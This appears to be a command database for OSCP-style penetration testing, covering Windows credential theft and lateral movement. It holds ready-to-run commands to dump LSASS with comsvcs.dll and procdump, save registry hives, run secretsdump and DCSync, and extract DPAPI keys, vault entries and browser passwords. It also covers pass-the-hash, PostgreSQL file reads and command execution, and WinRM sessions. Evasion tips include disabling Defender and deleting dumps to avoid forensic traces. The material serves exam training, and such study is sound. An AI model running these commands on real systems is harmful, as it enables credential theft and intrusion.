   Use .NET MiniDumpWriteDump API directly from PowerShell
   Advantage: No tool, pure PowerShell
   Disadvantage: Complex code, may be flagged by AMSI

COMSVCS VS PROCDUMP:
Comsvcs.dll:
  - Pros: No upload, built-in Windows, low AV detection, LOLBIN technique
  - Cons: Requires PID lookup, syntax less intuitive, limited error messages
  - OSCP Use: DEFAULT when tool upload not possible or AV enabled

Procdump:
  - Pros: Better syntax, clear errors, Microsoft-signed, accepts process name
  - Cons: Requires upload (500KB binary), may trigger AV upload detection
  - OSCP Use: When tool upload accepted and verified clean

OSCP EXAM TIPS:
1. Comsvcs is PREFERRED when Evil-WinRM/shell available but no upload possible
2. One-liner with PID lookup: for /f ""tokens=2"" %i in ('tasklist /fi ""imagename eq lsass.exe""') do @echo PID: %i (get PID) then use PID in command
3. PowerShell one-liner (cleaner): $p=(Get-Process lsass).Id; rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Temp\lsass.dmp full
4. Create output directory first: mkdir C:\Temp (if doesn't exist)
5. Verify dump size after creation: dir C:\Temp\lsass.dmp (should be 40-200MB)
6. Download immediately: Evil-WinRM  download C:\Temp\lsass.dmp
7. Delete dump after download: del C:\Temp\lsass.dmp (cleanup)
8. Parse on Kali: pypykatz lsa minidump lsass.dmp

COMPLETE ATTACK WORKFLOW:
1. Gain shell on Windows target (Evil-WinRM, web shell, reverse shell)
2. Verify admin rights: whoami /groups (look for Administrators + High Mandatory Level)
3. Get LSASS PID: tasklist /fi ""imagename eq lsass.exe"" (note PID, usually 600-800)
4. Create output directory: mkdir C:\Windows\Temp (or use existing writable location)
5. Dump LSASS: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
6. Verify dump: dir C:\Windows\Temp\lsass.dmp (check 40-200MB size, recent timestamp)
7. Download dump: Evil-WinRM  download C:\Windows\Temp\lsass.dmp OR SMB copy to Kali
8. Cleanup: del C:\Windows\Temp\lsass.dmp
9. Parse on Kali: pypykatz lsa minidump lsass.dmp > creds.txt
10. Extract hashes: grep ""NT:"" creds.txt | awk '{print $2}' > ntlm.txt
11. Pass-the-Hash: crackmapexec smb <TARGETS> -H ntlm.txt

DETECTION NOTES:
- Event ID 4688: Process creation (rundll32.exe execution)
- Event ID 4656/4663: LSASS process handle/memory access (if auditing enabled)
- SIEM alerts: LSASS memory dump triggers in mature environments
- rundll32.exe calling comsvcs.dll for non-COM+ process is suspicious
- Legitimate use: COM+ application debugging (rare on normal systems)
- Detection evasion: comsvcs.dll is Microsoft-signed (low base suspicion)

COMMON MISTAKES:
1. Forgetting comma after comsvcs.dll in syntax (CRITICAL - command fails without)
2. Using wrong PID (dumps wrong process, no credentials)
3. Not creating output directory first (C:\Temp may not exist)
4. Using 'normal' instead of 'full' dump type (misses credentials)
5. Not verifying dump file size (0 KB dump = failed silently)
6. Leaving dump on target (forensic artifact - always delete after download)

ADVANCED USAGE:
- PowerShell one-liner with auto-PID:
  (Get-Process lsass).Id | %{rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $_ C:\Temp\lsass.dmp full}

- Batch script with error handling:
  @echo off
  for /f ""tokens=2"" %%i in ('tasklist /fi ""imagename eq lsass.exe""') do set PID=%%i
  rundll32 C:\Windows\System32\comsvcs.dll, MiniDump %PID% C:\Temp\lsass.dmp full
  if exist C:\Temp\lsass.dmp (echo Success) else (echo Failed)

- Remote execution via WMI/PSExec:
  wmic /node:<TARGET> process call create ""rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full""
  (requires WMI access + remote path)

CREDENTIAL GUARD NOTES:
If Credential Guard enabled:
- comsvcs.dll dump may still succeed (creates file)
- But dump contains no credentials (pypykatz shows empty)
- Solution: Pivot to DCSync (if DA) or registry dumps (SAM/LSA Secrets)
- Detection: If dump succeeds but pypykatz shows no credentials, likely Credential Guard

WHY COMSVCS WORKS:
Legitimate Windows debugging feature:
1. COM+ Services (Component Object Model) are Windows service infrastructure
2. Developers debug COM+ app crashes using memory dumps
3. comsvcs.dll provides MiniDump API for this purpose
4. API works on ANY process (design flaw from security perspective)
5. rundll32 allows command-line DLL function calls
6. Combined: rundll32 + comsvcs.dll + MiniDump = LSASS dump with no tools","high","","","","{""Access is denied"": ""Not running with local administrator privileges OR LSASS protected. Solution: Verify admin: whoami /groups | findstr Administrators. Ensure 'High Mandatory Level' shown. If LSASS protected (Credential Guard/PPL): comsvcs.dll may still fail. Alternative: Use procdump with PPL bypass OR DCSync if Domain Admin available."", ""Invalid parameter / Syntax error"": ""Command syntax incorrect or PID wrong. CORRECT SYNTAX: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> <PATH> full. Note COMMA after comsvcs.dll (required). VERIFY PID: tasklist /fi \""imagename eq lsass.exe\"" - use PID exactly as shown. COMMON MISTAKE: Missing comma, wrong path separators, quotes around path (not needed unless spaces)."", ""File created but size is 0 KB or very small"": ""Dump failed mid-execution or insufficient permissions. Causes: (1) Disk space full. Solution: Check free space: dir C:\\ - need >500MB free. (2) AV quarantined dump during creation. Solution: Disable AV: Set-MpPreference -DisableRealtimeMonitoring $true. (3) LSASS terminated during dump. Solution: Rare - retry dump. VERIFY: Re-run with verbose error redirection: rundll32 ... 2>&1 | Out-File error.txt."", ""Want to use without knowing PID"": ""Must have PID for comsvcs.dll method (required parameter). Solution: Get PID first, then run dump in one line: PowerShell: $pid=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump $pid C:\\Temp\\lsass.dmp full. CMD: for /f \""tokens=2\"" %i in ('tasklist /fi \""imagename eq lsass.exe\""') do rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump %i C:\\Temp\\lsass.dmp full (complex but works).""}","{""rundll32.exe"": ""Windows utility for executing DLL functions from command line. LEGITIMACY: Built-in Windows binary (C:\\Windows\\System32\\rundll32.exe), used by Windows for legitimate purposes (Control Panel applets, Windows features). WHY FOR LSASS DUMP: rundll32 can call MiniDump export function from comsvcs.dll, which creates process memory dumps. LOLBIN STATUS: rundll32 is a Living Off The Land Binary - legitimate Windows binary abused for offensive purposes."", ""comsvcs.dll"": ""Windows DLL for COM+ Services (Component Services). LOCATION: C:\\Windows\\System32\\comsvcs.dll (exists on all Windows versions). FUNCTIONALITY: Contains MiniDump export function designed for creating crash dumps of COM+ applications. ABUSE: MiniDump function works on ANY process, including lsass.exe. WHY AV EVASION: Legitimate Windows DLL (Microsoft-signed), not flagged by AV. Defenders expect COM+ debugging, not LSASS credential theft."", ""MiniDump"": ""Export function within comsvcs.dll that creates memory dumps. FUNCTIONALITY: Identical to procdump -ma (full memory dump). Creates .dmp file containing full process memory for specified PID. PARAMETERS: MiniDump <PID> <OutputFile> <DumpType>. DumpType 'full' = complete memory dump (equivalent to procdump -ma). Alternative: 'normal' for smaller dump (may miss credentials - not recommended)."", ""<LSASS_PID>"": ""Process ID of lsass.exe to dump. FIND PID: tasklist /fi \""imagename eq lsass.exe\"" (shows PID in second column) OR Get-Process lsass | Select-Object Id OR wmic process where name='lsass.exe' get ProcessId. TYPICAL RANGE: 600-800 on most systems (LSASS starts early in boot). CRITICAL: Use exact PID, wrong PID dumps wrong process (no credentials)."", ""C:\\Temp\\lsass.dmp"": ""Output path for memory dump. LOCATION: Must be writable by current user. Recommended paths: C:\\Windows\\Temp\\, C:\\Temp\\ (create if needed: mkdir C:\\Temp), C:\\Users\\<USER>\\AppData\\Local\\Temp\\. FILE SIZE: 40-200MB (same as procdump). OPSEC: Use inconspicuous filename or temp location. Example: C:\\Windows\\Temp\\debug.dmp (blends with legitimate crash dumps)."", ""full"": ""Dump type parameter for MiniDump function. OPTIONS: 'full' = complete memory dump with all process data (REQUIRED for credential extraction). 'normal' = smaller dump, may miss credential memory regions (NOT recommended). 'mini' = minimal dump, insufficient for credentials. CRITICAL: Always use 'full' for LSASS dumps to ensure all credentials captured.""}","","[""procdump-lsass-dump"", ""mimikatz-sekurlsa-logonpasswords""]","[""pypykatz-parse-lsass"", ""evil-winrm-download-file""]"
"reg-save-sam","Registry Save SAM Hive","post-exploit","reg save HKLM\SAM <OUTPUT_PATH>\sam.save","Save SAM registry hive containing local account NTLM hashes","","reg save HKLM\SAM C:\Windows\Temp\sam.save","Requires SYSTEM or Administrator with SeBackupPrivilege. Must also save SYSTEM hive for decryption. Transfer both files to attacker for offline extraction with secretsdump.","high","","","","","","","",""
"reg-save-system","Registry Save SYSTEM Hive","post-exploit","reg save HKLM\SYSTEM <OUTPUT_PATH>\system.save","Save SYSTEM registry hive containing SAM decryption boot key","","reg save HKLM\SYSTEM C:\Windows\Temp\system.save","Required for SAM hash extraction. SYSTEM hive contains boot key (SYSKEY) needed to decrypt SAM hashes. Always extract with SAM hive.","high","","","","","","","",""
"reg-save-security","Registry Save SECURITY Hive","post-exploit","reg save HKLM\SECURITY <OUTPUT_PATH>\security.save","Save SECURITY registry hive containing LSA secrets and cached domain credentials","","reg save HKLM\SECURITY C:\Windows\Temp\security.save","Contains LSA secrets (service account plaintext passwords), cached domain credentials (DCC2 hashes), and DPAPI keys. Requires SYSTEM hive for decryption.","high","","","","","","","",""
"reg-query-sam","Registry Query SAM Access","post-exploit","reg query HKLM\SAM","Test access to SAM registry hive to verify privileges","","reg query HKLM\SAM","Quick test to verify SYSTEM/backup privileges before attempting reg save. If access denied, need to elevate privileges first.","medium","","","","","","","",""
"secretsdump-local-sam","Secretsdump Local SAM Extraction","post-exploit","impacket-secretsdump -sam <SAM_FILE> -system <SYSTEM_FILE> LOCAL","Extract NTLM hashes from local SAM and SYSTEM registry hive backups","","impacket-secretsdump -sam sam.save -system system.save LOCAL","Run on attacker machine after transferring SAM and SYSTEM files. Output format: username:RID:LM_hash:NTLM_hash. Use NTLM hash for pass-the-hash attacks.","high","","","","","","","",""
"secretsdump-lsa-secrets","Secretsdump LSA Secrets Extraction","post-exploit","impacket-secretsdump -security <SECURITY_FILE> -system <SYSTEM_FILE> LOCAL","Extract LSA secrets (service account passwords) from registry hive backups","","impacket-secretsdump -security security.save -system system.save LOCAL","Look for _SC_<ServiceName> entries - these contain PLAINTEXT service account passwords. Also includes $MACHINE.ACC (machine account hash) and DPAPI_SYSTEM key.","high","","","","","","","",""
"secretsdump-cached-creds","Secretsdump Cached Domain Credentials","post-exploit","impacket-secretsdump -security <SECURITY_FILE> -system <SYSTEM_FILE> LOCAL","Extract cached domain credentials (DCC2 hashes) from registry hive backups","","impacket-secretsdump -security security.save -system system.save LOCAL","DCC2 hashes cannot be used for pass-the-hash - must be cracked. Format: $DCC2$10240#username#hash. Crack with hashcat -m 2100.","high","","","","","","","",""
"secretsdump-remote","Secretsdump Remote Extraction","post-exploit","impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET>","Remotely extract SAM hashes, LSA secrets, and cached credentials with admin access","","impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.45.100","Requires admin credentials. Extracts all credential types in one command. No file transfer needed. Use -hashes for pass-the-hash authentication.","high","","","","","","","",""
"secretsdump-hashes","Secretsdump with Pass-the-Hash","post-exploit","impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET>","Remotely extract credentials using NTLM hash instead of password","","impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 YOURLAB/Administrator@192.168.45.100","Use when you have NTLM hash but not plaintext password. Colon prefix required: -hashes :NTLM_HASH (empty LM hash).","high","","","","","","","",""
"secretsdump-just-dc","Secretsdump Domain Controller (DCSync)","post-exploit","impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc","Extract all domain account hashes from DC via DRSUAPI (DCSync attack)","","impacket-secretsdump YOURLAB.LOCAL/Administrator:'Password123'@192.168.45.200 -just-dc","Requires Domain Admin or equivalent. Extracts ALL domain hashes including krbtgt (Golden Ticket). Ultimate goal in AD pentesting. Run against DC only.","high","","","","","{""-just-dc"": ""Extract only NTDS.dit domain credentials via DRSUAPI replication, skip SAM/LSA""}","","",""
"secretsdump-full","Secretsdump Full Extraction","post-exploit","impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET>","Extract all available credentials (SAM + LSA + cached) from target","","impacket-secretsdump YOURLAB/Administrator:'Password123'@192.168.45.100","Default behavior extracts everything accessible. On member servers: SAM + LSA + cached. On DCs: add -just-dc for NTDS.dit.","high","","","","","","","",""
"secretsdump-ntds-offline","Secretsdump NTDS.dit Offline","post-exploit","impacket-secretsdump -ntds <NTDS_FILE> -system <SYSTEM_FILE> LOCAL","Extract domain hashes from offline NTDS.dit database backup","","impacket-secretsdump -ntds ntds.dit -system system.save LOCAL","Use when you've extracted NTDS.dit via shadow copy or backup. SYSTEM hive must be from same DC. Extracts all domain account hashes.","high","","","","","","","",""
"mimikatz-sekurlsa-dpapi","Mimikatz DPAPI Master Keys","post-exploit","mimikatz.exe ""privilege::debug"" ""sekurlsa::dpapi"" ""exit""","Extract DPAPI master keys from LSASS for decrypting browser passwords and credential manager","","mimikatz.exe ""privilege::debug"" ""sekurlsa::dpapi"" ""exit""","DPAPI keys decrypt browser passwords, Credential Manager, and other protected data. Keys tied to user sessions in LSASS. Requires debug privilege.","high","","","","","","","",""
"mimikatz-vault-cred","Mimikatz Credential Vault","post-exploit","mimikatz.exe ""privilege::debug"" ""vault::cred /patch"" ""exit""","Extract Windows Credential Manager vault entries (RDP, network passwords)","","mimikatz.exe ""privilege::debug"" ""vault::cred /patch"" ""exit""","Credential Manager stores saved RDP credentials, network passwords, and web credentials. /patch enables extraction from protected vault. Rich source of reusable credentials.","high","","","","","","","",""
"comsvcs-minidump","LSASS Dump via comsvcs.dll","post-exploit","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> <OUTPUT_PATH>\lsass.dmp full","Dump LSASS memory using built-in comsvcs.dll (no external tools needed)","","rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Windows\Temp\lsass.dmp full","Living-off-the-land technique - uses built-in Windows DLL. Get PID: tasklist /fi ""imagename eq lsass.exe"". Analyze dump offline with mimikatz or pypykatz.","high","","","","","","","",""
"procdump-lsass","Procdump LSASS Memory Dump","post-exploit","procdump.exe -ma lsass.exe <OUTPUT_PATH>\lsass.dmp","Create full memory dump of LSASS process using Sysinternals procdump","","procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp","Signed Microsoft tool - often not flagged by AV. Download from Sysinternals. Analyze dump offline with mimikatz sekurlsa::minidump or pypykatz.","high","","","","","{""-ma"": ""Full memory dump (include all memory, not just active)""}","","",""
"pypykatz-minidump","Pypykatz Parse LSASS Dump","post-exploit","pypykatz lsa minidump <DUMP_FILE>","Extract credentials from LSASS memory dump on Linux using pypykatz","","pypykatz lsa minidump lsass.dmp","Pure Python mimikatz - analyze Windows LSASS dumps on Kali. No Windows needed. Same output as mimikatz sekurlsa::logonpasswords.","high","","","","","","","",""
"sharpchromium-logins","SharpChromium Browser Passwords","post-exploit","SharpChromium.exe logins","Extract saved passwords from Chrome/Edge browsers using DPAPI decryption","","SharpChromium.exe logins","Extracts Chrome/Edge saved passwords. Requires access to user profile and DPAPI keys. Run in user context or with mimikatz DPAPI keys extracted.","medium","","","","","","","",""
"cmdkey-list","List Credential Manager Entries","post-exploit","cmdkey /list","List Windows Credential Manager stored credentials (RDP, network shares)","","cmdkey /list","Shows saved credentials including RDP, network shares, and runas. Entries can be extracted with mimikatz vault::cred. Look for TERMSRV (RDP) and domain credentials.","high","","","","","","","",""
"hashcat-dcc2","Hashcat Crack DCC2 Hashes","post-exploit","hashcat -m 2100 <HASH_FILE> <WORDLIST>","Crack Windows cached domain credentials (DCC2/MSCash2) with hashcat","","hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt","DCC2 uses PBKDF2 with 10240 iterations - slow to crack. Use GPU acceleration. Hash format: $DCC2$10240#username#hash. Cannot be used for pass-the-hash.","high","","","","","{""-m 2100"": ""Hash mode for Domain Cached Credentials 2 (DCC2/MSCash2)""}","","",""
"john-mscash2","John Crack MSCash2 Hashes","post-exploit","john --format=mscash2 <HASH_FILE> --wordlist=<WORDLIST>","Crack Windows cached domain credentials with John the Ripper","","john --format=mscash2 dcc2.txt --wordlist=/usr/share/wordlists/rockyou.txt","Alternative to hashcat for DCC2 cracking. Slower than GPU but works on all systems. Use --rules for better coverage.","high","","","","","{""--format=mscash2"": ""Force MSCash2 (DCC2) hash format""}","","",""
"ssh-login-password","SSH Login with Password","exploitation","sshpass -p '<PASSWORD>' ssh <USERNAME>@<TARGET> -p <PORT>","Non-interactive SSH login using password (automated credential testing)","lateral-movement","sshpass -p 'password123' ssh root@192.168.45.100 -p 22","sshpass enables non-interactive SSH for scripts.

Dangerous in production (password visible in process list).

Time estimate:
10 seconds.

OSCP tips:
(1) Common credential reuse:
database passwords work for SSH.

(2) Test discovered users:
root, admin, user, www-data.

(3) For exam documentation, prefer manual SSH (interactive) for screenshots.

(4) Use -o options for exam targets:
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null.

(5) Alternative for scripting:
use SSH keys instead of sshpass.","high","","","","{""Host key verification failed"": ""Add -o StrictHostKeyChecking=no: sshpass -p '<PASS>' ssh -o StrictHostKeyChecking=no <USER>@<TARGET>"", ""Permission denied"": ""Wrong credentials or user not allowed SSH. Verify: grep <USER> /etc/ssh/sshd_config for AllowUsers/DenyUsers"", ""Connection refused"": ""SSH service not running or port wrong. Verify: sudo nmap -p <PORT> -Pn <TARGET>"", ""sshpass not found"": ""Install: sudo apt install sshpass""}","{""sshpass"": ""Tool for non-interactive SSH password authentication (bypasses interactive prompt)"", ""-p"": ""Provide password as command-line argument (use quotes for special chars)"", ""-p <PORT>"": ""Specify non-standard SSH port (default 22)""}","","","[""linux-sudo-list"", ""linux-suid-find"", ""linux-capabilities"", ""linux-linpeas""]"
"postgres-direct-connect","PostgreSQL Direct Connection","exploitation","psql -h <TARGET> -U <USERNAME> -d <DATABASE>","Establish direct connection to PostgreSQL database using psql client with extracted credentials","database","psql -h 192.168.45.100 -U postgres -d webapp_db","Password will be prompted interactively unless specified.

For automation/scripting:
PGPASSWORD='<PASSWORD>' psql -h <TARGET> -U <USERNAME> -d <DATABASE>.

Alternative non-interactive:
echo '<PASSWORD>' | psql -h <TARGET> -U <USERNAME> -d <DATABASE>.

Port can be specified with -p <PORT> if not default 5432.

After connection, use \du to list users, \l to list databases, \dt to list tables.

OSCP TIP:
If SQLi extraction revealed credentials but web shell failed, direct database connection often bypasses network restrictions (PostgreSQL port 5432 may be selectively allowed).

Time estimate:
2-5 minutes for connection and verification.

Document connection success in breakthrough.md.","high","","","","{""connection_refused"": ""Verify port: sudo nmap -p 5432 -Pn -v <TARGET>. Check firewall rules. Ensure PostgreSQL listening on 0.0.0.0 (not just 127.0.0.1)"", ""authentication_failed"": ""Verify credentials with SQL injection first. Password may be hashed in config. Try common defaults: postgres:postgres, admin:admin"", ""ssl_required"": ""Add --set=sslmode=require if server enforces SSL. Or disable: --set=sslmode=disable"", ""database_not_exist"": ""List databases first: psql -h <TARGET> -U <USERNAME> -l (no -d flag). Then connect to discovered database"", ""password_prompt_automation"": ""Use PGPASSWORD environment variable: PGPASSWORD='<PASSWORD>' psql -h <TARGET> -U <USERNAME> -d <DATABASE> (avoids interactive prompt)""}","{""-h"": ""Host - target PostgreSQL server IP address or hostname (default: localhost)"", ""-U"": ""Username - database user account to authenticate as"", ""-d"": ""Database - specific database name to connect to (default: same as username)""}","[""sqli-union-postgresql-info""]","","[""postgres-privilege-check"", ""postgres-file-enum"", ""postgres-file-read""]"
"postgres-privilege-check","PostgreSQL Superuser Privilege Check","exploitation","SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;","Verify if connected database user has superuser privileges (required for pg_read_file and pg_ls_dir functions)","database","","Superuser (usesuper=t) privileges enable powerful capabilities:
(1) Read arbitrary files with pg_read_file('/path/to/file'), (2) List directories with pg_ls_dir('/path/'), (3) Execute OS commands with COPY FROM PROGRAM (PostgreSQL 9.3+), (4) Read pg_shadow table (contains password hashes), (5) Modify postgresql.conf settings.

Non-superuser (usesuper=f) is restricted to:
SELECT on granted tables, cannot read files, cannot execute system commands.

OSCP TIP:
Many PostgreSQL installations use 'postgres' superuser with weak/default password.

If current user is not superuser, enumerate other users with:
SELECT usename,usesuper,valuntil FROM pg_user; Document privilege status immediately in investigation_checklist.md - determines entire exploitation path.

Time estimate:
1 minute.","high","","","","{""not_superuser"": ""Check other users: SELECT usename, usesuper FROM pg_user; Look for superuser accounts. Try extracting their passwords from pg_shadow (requires superuser). Alternative: exploit application-level vulnerabilities instead"", ""verify_specific_permissions"": ""Check file access: SELECT has_function_privilege('pg_read_file(text,bigint,bigint)', 'execute'); Returns TRUE if you can use pg_read_file"", ""check_available_functions"": ""List admin functions: \\df pg_* to see all PostgreSQL built-in functions you can use""}","{""current_user"": ""Returns the username of the current database session"", ""usesuper"": ""Boolean column in pg_user indicating superuser status (t=true, f=false)"", ""pg_user"": ""System catalog table containing all database user accounts and their privileges""}","[""postgres-direct-connect""]","","[""postgres-file-enum"", ""postgres-file-read""]"
"postgres-file-enum","PostgreSQL Directory Listing","exploitation","SELECT pg_ls_dir('<DIRECTORY>');","List directory contents using PostgreSQL built-in pg_ls_dir() function (requires superuser)","database","SELECT pg_ls_dir('/var/www');","Common directories to enumerate (priority order for OSCP):
(1) /var/www - web server files (often accessible), (2) /tmp - world-writable (always readable), (3) /home - user directories (rarely accessible), (4) /opt - custom applications, (5) /root - root home (usually denied), (6) / - filesystem root (overview).

Postgres user (uid=106 typically) permissions:
CAN read world-readable files and directories postgres owns or is in group, CANNOT read protected directories like /root, /etc/shadow, user home directories.

Advanced:
Combine with string_agg() for compact output:
SELECT string_agg(pg_ls_dir('/var/www'), ', '); OSCP WORKFLOW:
Start at /, identify promising directories, drill down systematically.

Document directory structure in investigation_checklist.md.

Time estimate:
5-10 minutes for thorough enumeration.","high","","","","{""permission_denied"": ""Try directories readable by postgres user: /tmp, /var/log/postgresql, /var/lib/postgresql, /var/www (if web server group). Cannot read: /root, /home/*, /etc/shadow"", ""function_not_exist"": ""Verify superuser: SELECT usesuper FROM pg_user WHERE usename=current_user; Must return 't'. Non-superuser cannot use pg_ls_dir"", ""directory_not_exist"": ""Check parent directory first: pg_ls_dir('/var') then pg_ls_dir('/var/www'). Build path incrementally"", ""systematic_enumeration"": ""Start at root: pg_ls_dir('/') then check: /home, /tmp, /var, /opt, /usr/local/bin. Look for: flag.txt, credentials, .ssh, backups""}","{""pg_ls_dir"": ""PostgreSQL built-in function to list directory contents (superuser only)"", ""<DIRECTORY>"": ""Must be absolute path (starts with /), not relative paths""}","[""postgres-direct-connect"", ""postgres-privilege-check""]","","[""postgres-file-read""]"
"postgres-file-read","PostgreSQL File Read","exploitation","SELECT pg_read_file('<FILE_PATH>');","Read file contents using PostgreSQL built-in pg_read_file() function (requires superuser and file read permissions)","database","SELECT pg_read_file('/var/www/flag.txt');","Full syntax:
pg_read_file(filename [, offset, length [, missing_ok]]).

Examples:
(1) Read entire file:
SELECT pg_read_file('/etc/passwd'); (2) Read first 100 bytes:
SELECT pg_read_file('/var/log/app.log', 0, 100); (3) Read middle chunk:
SELECT pg_read_file('/file', 500, 200); (4) Ignore missing:
SELECT pg_read_file('/maybe/not/here', 0, 1000, true); File access permissions:
Postgres user (uid=106) can read:
world-readable files (chmod 644), files in /var/www (if postgres in www-data group), /tmp files.

CANNOT read:
/root/*, /home/user/.ssh/*, /etc/shadow.

Common OSCP targets:
/var/www/flag.txt, /var/www/html/config.php, /home/user/local.txt, /root/proof.txt (rarely accessible), ~/.ssh/id_rsa (if accessible).

Alternative for command execution:
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd' but often hangs due to process restrictions.

Time estimate:
2-5 minutes once file located.

CAPTURE FLAG IMMEDIATELY - take screenshot, save output to breakthrough.md.","high","","","","{""permission_denied"": ""Verify file permissions: pg_stat_file('/var/www/flag.txt') shows owner/permissions. Postgres user needs read permission. Try world-readable files first"", ""file_too_large"": ""Read in chunks: pg_read_file('/large/file', 0, 1000) reads first 1000 bytes. Then pg_read_file('/large/file', 1000, 1000) for next chunk"", ""binary_file"": ""Cannot read binary files as text. Alternative: pg_read_binary_file() or COPY to export: COPY (SELECT pg_read_binary_file('/path')) TO '/tmp/output'"", ""encoding_issues"": ""Set client encoding: SET client_encoding = 'UTF8'; Then retry read. Or encode: SELECT encode(pg_read_binary_file('/file'), 'base64');""}","{""pg_read_file"": ""PostgreSQL superuser function to read file contents and return as text"", ""<FILE_PATH>"": ""Must be absolute path, file must be readable by postgres OS user"", ""offset (optional)"": ""Byte offset to start reading from (default: 0)"", ""length (optional)"": ""Number of bytes to read (default: entire file)""}","[""postgres-direct-connect"", ""postgres-privilege-check"", ""postgres-file-enum""]","",""
"winrm-enter-pssession","WinRM - Enter-PSSession Interactive","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Enter-PSSession -ComputerName <TARGET> -Credential $credential","Establish interactive PowerShell remoting session using Enter-PSSession (native Windows PowerShell)","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); Enter-PSSession -ComputerName 192.168.50.73 -Credential $credential","OSCP TRAINING MATERIAL - POWERSHELL REMOTING (ENTER-PSSESSION):
TRAINING WORKFLOW:
From OSCP module, PowerShell remoting demonstrated with session creation:
1.

Create PSCredential object (ConvertTo-SecureString + New-Object PSCredential)

2.

New-PSSession -ComputerName 192.168.50.73 -Credential $credential (creates session)

3.

Enter-PSSession 1 (connects to session ID 1 interactively)

4.

Commands execute remotely, verified with whoami/hostname showing FILES04

WHAT IS POWERSHELL REMOTING:
Microsoft's official remote administration protocol called ""PowerShell remoting"" - built-in WinRM capability accessed through PowerShell cmdlets.

Invoked via Enter-PSSession for interactive access.

PROTOCOL:
WinRM over WS-Management:
- Port 5985:
HTTP (plain HTTP traffic)
- Port 5986:
HTTPS (encrypted SSL/TLS traffic)
- Based on WS-Management open standard

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
User must be member of:
- Administrators group (default), OR
- Remote Management Users group

on the target machine.

PSCREDENTIAL OBJECT CREATION (REQUIRED):
Training shows three-step process:
  $username = 'jen'
  $password = 'Nexus123!'
  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString

This pattern is reusable across WMI, WinRM, and other PowerShell remote operations.

INTERACTIVE SESSION BEHAVIOR:
- Prompt changes to [TARGET]:
PS C:\Users\username>
- All commands execute in remote PowerShell context
- Current directory, environment variables are REMOTE system's
- Exit-PSSession returns to local prompt
- Session persists after disconnection (can reconnect with Enter-PSSession)

COMPARISON - ENTER-PSSESSION VS NEW-PSSESSION:
- Enter-PSSession:
  Interactive (like SSH), single target, manual command entry

- New-PSSession:
  Creates session object for programmatic use with Invoke-Command

- Both use WinRM, same port requirements, same authentication

LOGGING & DETECTION:
- Event ID 4624:
Logon event (Type 3:
Network logon)
- Event ID 4688:
Process creation (PowerShell.exe)
- WinRM event logs:
Microsoft-Windows-WinRM/Operational
- PowerShell script block logging (if enabled)
- MORE VISIBLE than WMI/DCOM - creates legitimate admin session logs

WHOAMI BEHAVIOR:
Training notes whoami shows remote user identity correctly (corp\jen on FILES04), confirming remote execution context.

Time:
2-3 minutes (PSCredential creation + session establishment + verification)

EXAM STRATEGY:
Most stable and feature-rich WindowsWindows lateral movement.

Use when you control Windows attack box and want interactive access.

For automation, use Invoke-Command or New-PSSession.","high","","","","{""Access is denied"": ""User must be in Remote Management Users or Administrators group. Verify: net user <USER> /domain"", ""WinRM cannot complete"": ""Check WinRM enabled: Test-WSMan -ComputerName <TARGET>"", ""Connection timeout"": ""Firewall blocking port 5985/5986: Test-NetConnection <TARGET> -Port 5985"", ""SSL certificate error"": ""Use -UseSSL flag for port 5986 or -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)""}","{""ConvertTo-SecureString"": ""Converts plain text password to encrypted SecureString object"", ""-AsPlainText"": ""Accepts plain text password input"", ""-Force"": ""Suppresses confirmation prompts"", ""New-Object PSCredential"": ""Creates credential object for authentication"", ""Enter-PSSession"": ""Establishes interactive remote PowerShell session"", ""-ComputerName"": ""Target system hostname or IP address"", ""-Credential"": ""PSCredential object containing username and password""}","","[""winrm-new-pssession"", ""winrm-invoke-command"", ""evil-winrm-creds""]",""
"winrm-new-pssession","WinRM - New-PSSession Reusable Session","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $session = New-PSSession -ComputerName <TARGET> -Credential $credential; Invoke-Command -Session $session -ScriptBlock {<COMMAND>}","Create persistent reusable PowerShell remoting session with New-PSSession for multiple command execution","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); $session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential; Invoke-Command -Session $session -ScriptBlock {whoami; hostname}","EDUCATIONAL CONTEXT:
New-PSSession creates persistent session object for efficient multi-command execution.

WHY PERSISTENT:
Avoids re-authentication overhead for each command - session remains open until explicitly removed.

ADVANTAGES OVER ENTER-PSSESSION:
- Non-blocking (can run commands in background)
- Supports parallel execution on multiple targets
- Better for automation

USE CASE:
Batch automation - execute multiple scripts without reconnecting.

PERFORMANCE:
- First command slower (session creation)
- Subsequent commands faster (reuse)

SESSION MANAGEMENT:
- View sessions:
Get-PSSession
